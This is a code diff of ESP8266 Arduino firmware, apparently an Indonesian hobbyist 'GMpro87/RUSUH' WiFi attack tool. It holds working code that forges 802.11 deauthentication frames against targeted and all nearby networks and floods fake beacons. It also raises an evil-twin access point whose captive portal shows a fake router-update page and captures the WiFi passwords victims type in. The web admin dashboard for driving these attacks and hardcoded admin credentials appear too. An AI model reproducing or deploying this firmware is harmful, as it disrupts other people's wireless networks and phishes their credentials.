@@ -1,218 +1,285 @@
-#include <Arduino.h>
 #include <ESP8266WiFi.h>
-#include <DNSServer.h>
 #include <ESP8266WebServer.h>
-#include <EEPROM.h>
+#include <DNSServer.h>
 
 extern "C" {
-#include "user_interface.h"
+  #include "user_interface.h"
 }
 
-// --- CONFIG ---
-const char* ADMIN_SSID = "GMpro";
-const char* ADMIN_PASS = "Sangkur87";
-
-typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; } _Network;
-_Network _networks[16];
-_Network _selectedNetwork;
-
-const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 4, 1);
+ESP8266WebServer server(80);
 DNSServer dnsServer;
-ESP8266WebServer webServer(80);
 
-String _correct = "";
-String _tryPassword = "";
-String _lastLog = "Sistem Ready";
-uint32_t _pktCount = 0;
+// --- STATE GLOBAL (UTUH) ---
+String capturedPass = "Waiting...";
+String currentTargetSSID = "None";
+String customHtml = "<html><body style='text-align:center;'><h2>Router Update</h2><form method='POST' action='/login'>Password:<br><input type='password' name='pw'><input type='submit' value='OK'></form></body></html>";
+String spamSSID = "WiFi_Rusuh_87";
+int spamQty = 10;
 
-bool hotspot_active = false;
-bool mass_kill_active = false;
-bool deauth_target_active = false;
-bool beacon_spam_active = false;
+uint8_t targetMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+int deauthPkt = 0;
+int beaconPkt = 0;
+bool isDeauthing = false;
+bool isMassDeauth = false;
+bool isBeaconSpam = false;
 
-unsigned long last_attack = 0;
+struct WiFiNetwork { String ssid; int ch; int rssi; uint8_t bssid[6]; };
+WiFiNetwork networks[20];
+int networksFound = 0;
 
-const char* fake_ssids_50[] = {
-  "iPhone 13", "AndroidAP_9921", "Xiaomi Mi 11", "Galaxy S21 Ultra", "OPPO A95", 
-  "Rumah_WiFi", "TP-Link_9920", "Tenda_F3_New", "MNC_Play_Ext", "Biznet_Home_5G",
-  "Family_WiFi", "Guest_WiFi", "Printer_Epson_L3110", "CCTV_Home", "Vivo_V20",
-  "Hotspot_Pribadi", "IndiHome-8822", "Linksys_Smart", "D-Link_DIR", "ASUS_Router",
-  "Cafe_Free_WiFi", "Meeting_Room", "Staff_Only", "Smart_Home_Hub", "Realme_C25",
-  "iPhone 12 Mini", "Samsung_Tab_S7", "Huawei_P40", "My_WiFi", "Netgear_Pro",
-  "Dapur_WiFi", "Kamar_Atas", "WiFi_Kenceng", "Jaringan_Gratis", "Admin_WiFi",
-  "Public_Hotspot", "Telkomsel_Orbit", "XL_Home_Fiber", "Oxygen_Home", "CBN_Fiber",
-  "Starlink_Gen2", "Google_Fiber", "Sony_Bravia_TV", "LG_Smart_ThinQ", "Xbox_Live",
-  "PlayStation_Network", "Nintendo_Switch", "Tesla_Car_WiFi", "Guest_Access", "User_WiFi"
-};
+// MASUKKAN HTML ORI LU DI SINI
+const char ADMIN_HTML[] PROGMEM = R"=====(
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <style>
+        body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}
+        @keyframes rainbow {
+            0% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
+            20% { color: #ff0; text-shadow: 0 0 15px #ff0; border-color: #ff0; box-shadow: 0 0 10px #ff0; }
+            40% { color: #0f0; text-shadow: 0 0 15px #0f0; border-color: #0f0; box-shadow: 0 0 10px #0f0; }
+            60% { color: #0ff; text-shadow: 0 0 15px #0ff; border-color: #0ff; box-shadow: 0 0 10px #0ff; }
+            80% { color: #f0f; text-shadow: 0 0 15px #f0f; border-color: #f0f; box-shadow: 0 0 10px #f0f; }
+            100% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
+        }
+        .rainbow-text { font-size: 22px; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 15px 0; display: inline-block; padding: 10px 20px; border: 3px solid; border-radius: 10px; animation: rainbow 3s linear infinite; }
+        .dev{font-size:10px;color:#888;margin-bottom:15px}
+        .tabs{display:flex;margin-bottom:15px;border-bottom:1px solid orange}
+        .tab-btn{flex:1;padding:12px;background:#222;color:#fff;border:none;cursor:pointer;font-size:12px}
+        .active-tab{background:orange;color:#000;font-weight:bold}
+        .ctrl{display:flex; flex-wrap:wrap; justify-content:space-between; margin-bottom:10px}
+        .cmd-box{width:48%; background:#111; padding:5px; border-radius:4px; border:1px solid #333; margin-bottom:5px; box-sizing:border-box}
+        .scan-box{width:100%; margin-bottom:10px; border:1px solid #00bcff}
+        .cmd{width:100%; padding:12px 0; border:none; border-radius:4px; color:#fff; font-weight:bold; font-size:10px; text-transform:uppercase; cursor:pointer}
+        .log-c{font-size:10px; margin-top:4px; font-family:monospace; font-weight:bold}
+        @keyframes pulse-active { 0% { box-shadow: 0 0 2px #fff; } 50% { box-shadow: 0 0 15px #fff; opacity: 0.8; } 100% { box-shadow: 0 0 2px #fff; } }
+        .btn-active { animation: pulse-active 0.6s infinite; border: 2px solid #fff !important; }
+        .pass-box{background:#050; color:#0f0; border:2px dashed #0f0; padding:12px; margin:15px 0; text-align:left; border-radius:8px; font-family:monospace}
+        .pass-text{font-size:18px; color:#fff; font-weight:bold; display:block; margin-top:5px}
+        table{width:100%; border-collapse:collapse; font-size:12px; margin-bottom:15px}
+        th,td{padding:10px 5px; border:1px solid #146dcc}
+        th{background:rgba(20,109,204,0.3); color:orange; text-transform:uppercase}
+        .btn-sel{background:#eb3489; color:#fff; border:none; padding:6px; border-radius:4px; width:100%; font-size:11px}
+        .btn-ok{background:#FFC72C; color:#000; border:none; padding:6px; border-radius:4px; width:100%; font-weight:bold; font-size:11px}
+        .set-box{background:#111; padding:10px; border:1px solid #444; margin-bottom:15px; text-align:left; font-size:12px; border-radius:5px}
+        .inp{background:#222; color:orange; border:1px solid orange; padding:8px; border-radius:4px; width:94%; margin:5px 0}
+        .txt-area{width:94%; height:150px; background:#111; color:#0f0; border:1px solid #444; font-family:monospace; padding:10px}
+        #previewModal{display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; padding:20px; box-sizing:border-box}
+        .modal-content{background:#fff; width:100%; height:85%; border-radius:10px; overflow:auto; color:#000; text-align:left; padding:15px}
+        hr{border:0; border-top:1px solid orange; margin:15px 0}
+        .hidden{display:none}
+    </style>
+</head>
+<body>
+    <div class="rainbow-text">GMpro87</div>
+    <div class='dev'>dev : 9u5M4n9 | HackerPro87</div>
+    <div class="tabs">
+        <button class="tab-btn active-tab" onclick="openTab('dash', this)">DASHBOARD</button>
+        <button class="tab-btn" onclick="openTab('webset', this)">SETTINGS</button>
+    </div>
 
-// --- EEPROM HELPERS ---
-void savePassword(String pw) {
-  for (int i = 0; i < pw.length(); ++i) EEPROM.write(i, pw[i]);
-  EEPROM.write(pw.length(), '\0');
-  EEPROM.commit();
-}
+    <div id="dash">
+        <div class='ctrl'>
+            <div class="cmd-box scan-box">
+                <form method='post' action='/?admin=1&scan=1'><button id="btnScan" class='cmd' style='background:#00bcff'>SCAN TARGET</button></form>
+                <div id="scanLog" class="log-c" style="color:#fff">READY</div>
+            </div>
+            <div class="cmd-box">
+                <form method='post' action='/?admin=1&deauth=toggle'><button id="btnDeauth" class='cmd' style='background:#0c8'>DEAUTH</button></form>
+                <div id="logDeauth" class="log-c" style="color:#0f0">0 pkt</div>
+            </div>
+            <div class="cmd-box">
+                <form method='post' action='/?admin=1&rusuh=toggle'><button id="btnRusuh" class='cmd' style='background:#e60'>MASSDEAUTH</button></form>
+                <div id="logRusuh" class="log-c" style="color:#fff">READY</div>
+            </div>
+            <div class="cmd-box">
+                <form method='post' action='/?admin=1&beacon=toggle'><button id="btnBeacon" class='cmd' style='background:#60d'>BEACON</button></form>
+                <div id="logBeacon" class="log-c" style="color:#0ff">0 pkt</div>
+            </div>
+            <div class="cmd-box">
+                <form method='post' action='/?admin=1&hotspot=1'><button id="btnHotspot" class='cmd' style='background:#a53'>EVILTWIN</button></form>
+                <div id="logHotspot" class="log-c" style="color:#f44">LED: OFF</div>
+            </div>
+        </div>
+        <hr>
+        <div id="tableContainer">Menunggu Scan...</div>
+        <div class='pass-box'>
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <b>[ CAPTURED PASS ]</b>
+                <a href='/?admin=1&clearLog=1' onclick="return confirm('Hapus permanen?')" style='color:#f44; font-size:10px; text-decoration:none;'>[ CLEAR ]</a>
+            </div>
+            <div id="passContent">
+                Target: <span id="curTarget">None</span><br>
+                Pass : <span id="curPass" class="pass-text">Waiting...</span>
+            </div>
+        </div>
+    </div>
 
-String loadPassword() {
-  String pw = "";
-  for (int i = 0; i < 32; ++i) {
-    char c = char(EEPROM.read(i));
-    if (c == '\0') break;
-    pw += c;
-  }
-  return pw;
-}
+    <div id="webset" class="hidden">
+        <div class='set-box'>
+            <b style='color:orange'>BEACON SPAM CONFIG:</b><br>
+            <form method='post' action='/?admin=1&updateSpam=1'>
+                SSID Name: <input class='inp' name='spamName' value="WiFi_Rusuh_87"><br>
+                Qty Packet: <input class='inp' type="number" name='spamQty' value="10"><br>
+                <button class='btn-ok' style='width:100%'>SAVE & UPDATE</button>
+            </form>
+        </div>
+        <div class='set-box'>
+            <b style='color:orange'>CUSTOM EVILTWIN HTML:</b><br>
+            <textarea id="htmlEditor" class="txt-area" placeholder="Paste HTML lu di sini..."></textarea>
+            <div style="display:flex; gap:10px; margin-top:10px">
+                <button onclick="previewHtml()" class="btn-sel" style="flex:1; background:#00bcff">PREVIEW</button>
+                <form method='post' action='/?admin=1&saveHtml=1' style="flex:1">
+                    <input type="hidden" id="saveData" name="newHtml">
+                    <button onclick="document.getElementById('saveData').value = document.getElementById('htmlEditor').value" class='btn-ok' style='width:100%'>SAVE HTML</button>
+                </form>
+            </div>
+        </div>
+    </div>
 
-// --- ATTACK ENGINE ---
-void sendPkt(uint8_t* buf, uint16_t len) {
-  if (wifi_send_pkt_freedom(buf, len, 0) == 0) _pktCount++;
-  yield();
-}
+    <div id="previewModal">
+        <div class="modal-content" id="previewContainer"></div>
+        <button onclick="closePreview()" class="btn-ok" style="margin-top:20px; background:red; color:white; width:100%">CLOSE PREVIEW</button>
+    </div>
 
-void deauthAction(uint8_t* bssid, uint8_t ch) {
-  wifi_set_channel(ch);
-  uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x01, 0x00};
-  memcpy(&pkt[10], bssid, 6);
-  memcpy(&pkt[16], bssid, 6);
-  sendPkt(pkt, 26);
-  pkt[0] = 0xA0; // Disassociate
-  sendPkt(pkt, 26);
-}
+    <script>
+        function openTab(tabId, btn) {
+            document.getElementById('dash').classList.add('hidden');
+            document.getElementById('webset').classList.add('hidden');
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active-tab'));
+            document.getElementById(tabId).classList.remove('hidden');
+            btn.classList.add('active-tab');
+        }
 
-void sendBeacon(const char* ssid) {
-  uint8_t packet[128];
-  int ssid_len = strlen(ssid);
-  uint8_t header[] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x00 };
-  memcpy(packet, header, sizeof(header));
-  int pos = sizeof(header);
-  packet[pos++] = 0x00; packet[pos++] = ssid_len;
-  memcpy(&packet[pos], ssid, ssid_len); pos += ssid_len;
-  uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
-  memcpy(&packet[pos], rates, sizeof(rates)); pos += sizeof(rates);
-  sendPkt(packet, pos);
-}
+        function previewHtml() {
+            var code = document.getElementById('htmlEditor').value;
+            var container = document.getElementById('previewContainer');
+            container.innerHTML = code;
+            document.getElementById('previewModal').style.display = 'block';
+        }
+        function closePreview() { document.getElementById('previewModal').style.display = 'none'; }
 
-// --- ADMIN DASHBOARD ---
-void handleAdmin() {
-  if (webServer.hasArg("scan")) {
-    _lastLog = "Scanning WiFi...";
-    int n = WiFi.scanNetworks();
-    for (int i = 0; i < n && i < 16; ++i) {
-      _networks[i].ssid = WiFi.SSID(i);
-      _networks[i].ch = WiFi.channel(i);
-      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
-    }
-    _lastLog = "Scan Berhasil (" + String(n) + " ditemukan)";
-  }
+        function updateUI() {
+            fetch('/st').then(r => r.json()).then(d => {
+                document.getElementById('logDeauth').innerText = d.deauthPkt + " pkt";
+                document.getElementById('logBeacon').innerText = d.beaconPkt + " pkt";
+                document.getElementById('curPass').innerText = d.pass;
+                document.getElementById('curTarget').innerText = d.target;
+                document.getElementById('tableContainer').innerHTML = d.table;
+                
+                if(d.isD) document.getElementById('btnDeauth').classList.add('btn-active');
+                else document.getElementById('btnDeauth').classList.remove('btn-active');
+                
+                if(d.isM) {
+                   document.getElementById('btnRusuh').classList.add('btn-active');
+                   document.getElementById('logRusuh').innerText = "ATTACKING...";
+                } else {
+                   document.getElementById('btnRusuh').classList.remove('btn-active');
+                   document.getElementById('logRusuh').innerText = "READY";
+                }
 
-  if (webServer.hasArg("ap")) {
-    int idx = webServer.arg("ap").toInt();
-    if(idx >= 0 && idx < 16) {
-      _selectedNetwork = _networks[idx];
-      _lastLog = "Terkunci: " + _selectedNetwork.ssid;
-    }
-  }
-
-  if (webServer.hasArg("deauth")) { deauth_target_active = (webServer.arg("deauth") == "1"); _pktCount = 0; if(deauth_target_active) _lastLog = "Deauthing " + _selectedNetwork.ssid; }
-  if (webServer.hasArg("kill")) { mass_kill_active = (webServer.arg("kill") == "1"); _pktCount = 0; if(mass_kill_active) _lastLog = "Mass Killing Active"; }
-  if (webServer.hasArg("spam")) { beacon_spam_active = (webServer.arg("spam") == "1"); _pktCount = 0; if(beacon_spam_active) _lastLog = "SSID Spamming Active"; }
-  if (webServer.hasArg("stop")) { deauth_target_active = mass_kill_active = beacon_spam_active = hotspot_active = false; _lastLog = "Serangan Berhenti"; }
-  if (webServer.hasArg("clear")) { for (int i = 0; i < 512; i++) EEPROM.write(i, 0); EEPROM.commit(); _correct = ""; _lastLog = "Data Dihapus"; }
-  
-  if (webServer.hasArg("hotspot")) {
-    hotspot_active = (webServer.arg("hotspot") == "1");
-    if(hotspot_active && _selectedNetwork.ssid != "") {
-      WiFi.softAPdisconnect(true);
-      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
-      _lastLog = "Evil Twin Aktif";
-    } else {
-      hotspot_active = false;
-      WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
-      _lastLog = "Admin Mode On";
-    }
-  }
-
-  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
-  h += "body{background:#000;color:#fff;font-family:sans-serif;padding:10px;margin:0;}h2{color:#00d4ff;border-bottom:2px solid #222;padding-bottom:10px;}";
-  h += "button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-weight:bold;color:#fff;cursor:pointer;text-transform:uppercase;}";
-  h += ".r{background:#f44336;}.p{background:#9c27b0;}.b{background:#2196f3;}.g{background:#444;}.y{background:#ffa000;}.s{background:#00c853;}";
-  h += ".active{border:2px solid #fff;box-shadow:0 0 15px #fff;}.result-box{background:#2e7d32;padding:12px;border-radius:5px;margin-bottom:15px;display:flex;justify-content:space-between;align-items:center;}";
-  h += ".log{background:#111;color:#0f0;padding:10px;font-family:monospace;font-size:12px;margin:10px 0;border:1px solid #333;border-radius:5px;}";
-  h += "table{width:100%;border-collapse:collapse;margin-top:15px;}th,td{padding:10px;border-bottom:1px solid #333;text-align:left;font-size:13px;}th{background:#111;color:#00d4ff;}";
-  h += ".sel-btn{background:#00d4ff !important;color:#000 !important;font-weight:900;}</style></head><body>";
-  
-  h += "<h2>RUSUH V2 (GMpro)</h2>";
-  if(_correct != "") h += "<div class='result-box'><span>RESULT: <b>"+_correct+"</b></span><button class='y' style='width:auto;padding:5px 10px;' onclick=\"location.href='/?clear=1'\">HAPUS</button></div>";
-  h += "<p>Target: <b>"+_selectedNetwork.ssid+"</b></p>";
-  
-  h += "<button class='r "+String(deauth_target_active?"active":"")+"' onclick=\"location.href='/?deauth="+(deauth_target_active?"0":"1")+"'\">DEAUTH TARGET</button>";
-  h += "<button class='r "+String(mass_kill_active?"active":"")+"' onclick=\"location.href='/?kill="+(mass_kill_active?"0":"1")+"'\">MASS KILL ALL</button>";
-  
-  h += "<div class='log'>Status: "+_lastLog+"<br>Pkt Sent: "+String(_pktCount)+"</div>";
-  
-  h += "<button class='p "+String(beacon_spam_active?"active":"")+"' onclick=\"location.href='/?spam="+(beacon_spam_active?"0":"1")+"'\">SPAM 50 SSID</button>";
-  h += "<button class='b "+String(hotspot_active?"active":"")+"' onclick=\"location.href='/?hotspot="+(hotspot_active?"0":"1")+"'\">EVIL TWIN</button>";
-  h += "<button class='g' onclick=\"location.href='/?stop=1'\">🛑 STOP ALL ATTACKS</button>";
-  
-  h += "<button class='s' onclick=\"location.href='/?scan=1'\">🔍 SCAN WIFI SEKITAR</button>";
-
-  h += "<table><thead><tr><th>SSID</th><th>CH</th><th>AKSI</th></tr></thead><tbody>";
-  for(int i=0; i<16; i++){
-    if(_networks[i].ssid == "") break;
-    bool isSel = (_networks[i].ssid == _selectedNetwork.ssid);
-    h += "<tr><td>"+_networks[i].ssid+"</td><td>"+String(_networks[i].ch)+"</td><td><button class='g "+(isSel?"sel-btn":"")+"' style='width:auto;padding:5px 10px;' onclick=\"location.href='/?ap="+String(i)+"'\">"+(isSel?"SELECTED":"SELECT")+"</button></td></tr>";
-  }
-  h += "</tbody></table></body></html>";
-  webServer.send(200, "text/html", h);
-}
+                if(d.isB) document.getElementById('btnBeacon').classList.add('btn-active');
+                else document.getElementById('btnBeacon').classList.remove('btn-active');
+            });
+        }
+        setInterval(updateUI, 2000);
+    </script>
+</body>
+</html>
+)=====";
 
 void setup() {
-  EEPROM.begin(512);
-  _correct = loadPassword();
+  Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
-  dnsServer.start(DNS_PORT, "*", apIP);
-  
-  webServer.on("/", [](){
-    if (hotspot_active) {
-      if (webServer.hasArg("password")) {
-        _tryPassword = webServer.arg("password");
-        WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
-        webServer.send(200, "text/html", "Verifying... <script>setTimeout(function(){location.href='/check';},5000);</script>");
-      } else {
-        webServer.send(200, "text/html", "<html><body style='font-family:sans-serif;padding:20px;background:#000;color:#fff;'><h2>Security Update</h2><p>Verifikasi untuk <b>"+_selectedNetwork.ssid+"</b></p><form method='post'><input type='password' name='password' style='width:100%;padding:10px;' placeholder='Masukkan Password WiFi'><br><br><input type='submit' value='UPDATE' style='width:100%;padding:10px;background:#2196f3;color:#fff;border:none;'></form></body></html>");
+  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
+  WiFi.softAP("GMpro87_Admin", "12345678"); 
+  dnsServer.start(53, "*", IPAddress(192,168,4,1));
+
+  server.on("/", []() {
+    if (server.hasArg("admin")) {
+      if (server.hasArg("scan")) WiFi.scanNetworks(true);
+      if (server.hasArg("deauth")) isDeauthing = !isDeauthing;
+      if (server.hasArg("rusuh")) isMassDeauth = !isMassDeauth;
+      if (server.hasArg("beacon")) isBeaconSpam = !isBeaconSpam;
+      if (server.hasArg("updateSpam")) {
+        spamSSID = server.arg("spamName");
+        spamQty = server.arg("spamQty").toInt();
       }
-    } else { handleAdmin(); }
+      if (server.hasArg("saveHtml")) customHtml = server.arg("newHtml");
+      if (server.hasArg("sel")) {
+        int idx = server.arg("sel").toInt();
+        currentTargetSSID = networks[idx].ssid;
+        memcpy(targetMac, networks[idx].bssid, 6);
+      }
+      if (server.hasArg("hotspot")) WiFi.softAP(currentTargetSSID.c_str());
+      if (server.hasArg("clearLog")) capturedPass = "Waiting...";
+    }
+    server.send_P(200, "text/html", ADMIN_HTML);
   });
 
-  webServer.on("/check", [](){
-    if(WiFi.status() == WL_CONNECTED) { 
-      _correct = _tryPassword; 
-      savePassword(_correct); 
-      deauth_target_active = mass_kill_active = beacon_spam_active = hotspot_active = false;
-      WiFi.disconnect();
-      WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
+  server.on("/st", []() {
+    String table = "<table><tr><th>SSID</th><th>Ch</th><th>RSSI</th><th>TARGET</th></tr>";
+    int n = WiFi.scanComplete();
+    if(n > 0) {
+      networksFound = n;
+      for(int i=0; i<n && i<20; i++) {
+        networks[i].ssid = WiFi.SSID(i);
+        networks[i].ch = WiFi.channel(i);
+        networks[i].rssi = WiFi.RSSI(i);
+        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
+        String btnClass = (networks[i].ssid == currentTargetSSID) ? "btn-ok" : "btn-sel";
+        String btnText = (networks[i].ssid == currentTargetSSID) ? "SELECTED" : "SELECT";
+        table += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].ch)+"</td><td>"+String(networks[i].rssi)+"</td><td><form method='post' action='/?admin=1&sel="+String(i)+"'><button class='"+btnClass+"'>"+btnText+"</button></form></td></tr>";
+      }
     }
-    webServer.send(200, "text/html", "<script>location.href='/';</script>");
+    table += "</table>";
+    
+    String json = "{\"deauthPkt\":"+String(deauthPkt)+",\"beaconPkt\":"+String(beaconPkt)+",\"pass\":\""+capturedPass+"\",\"target\":\""+currentTargetSSID+"\",\"table\":\""+table+"\",\"isD\":"+(isDeauthing?"1":"0")+",\"isM\":"+(isMassDeauth?"1":"0")+",\"isB\":"+(isBeaconSpam?"1":"0")+"}";
+    server.send(200, "application/json", json);
   });
-  webServer.begin();
+
+  server.on("/login", HTTP_POST, []() {
+    if(server.hasArg("pw")) capturedPass = server.arg("pw");
+    server.send(200, "text/html", "System Update... Please wait.");
+  });
+
+  server.onNotFound([]() {
+    server.send(200, "text/html", customHtml);
+  });
+
+  server.begin();
+  wifi_promiscuous_enable(1);
 }
 
 void loop() {
   dnsServer.processNextRequest();
-  webServer.handleClient();
+  server.handleClient();
 
-  if ((mass_kill_active || beacon_spam_active || deauth_target_active) && millis() - last_attack > 400) {
-    if (deauth_target_active && _selectedNetwork.ssid != "") deauthAction(_selectedNetwork.bssid, _selectedNetwork.ch);
-    if (mass_kill_active) {
-      for (int i = 0; i < 16; i++) if (_networks[i].ch != 0) deauthAction(_networks[i].bssid, _networks[i].ch);
-    }
-    if (beacon_spam_active) {
-      for (int i = 0; i < 50; i++) sendBeacon(fake_ssids_50[i]);
-    }
-    last_attack = millis();
+  if (isDeauthing) {
+    uint8_t pkt[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], 0x00, 0x00, 0x01, 0x00};
+    wifi_send_pkt_freedom(pkt, 26, 0);
+    deauthPkt++;
+    delay(1);
   }
+
+  if (isMassDeauth) {
+    for (int ch = 1; ch <= 13; ch++) {
+      wifi_set_channel(ch);
+      uint8_t pkt[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0x00, 0x00, 0x01, 0x00};
+      for(int i=0; i<5; i++) wifi_send_pkt_freedom(pkt, 26, 0);
+      delay(10);
+    }
+  }
+
+  if (isBeaconSpam) {
+    for(int i=0; i<spamQty; i++) {
+      uint8_t pkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04, 0x00, (uint8_t)spamSSID.length() };
+      for(int j=0; j<spamSSID.length(); j++) pkt[38+j] = spamSSID[j];
+      wifi_send_pkt_freedom(pkt, 38 + spamSSID.length(), 0);
+      beaconPkt++;
+    }
+    delay(100);
+  }
+  yield();
 }
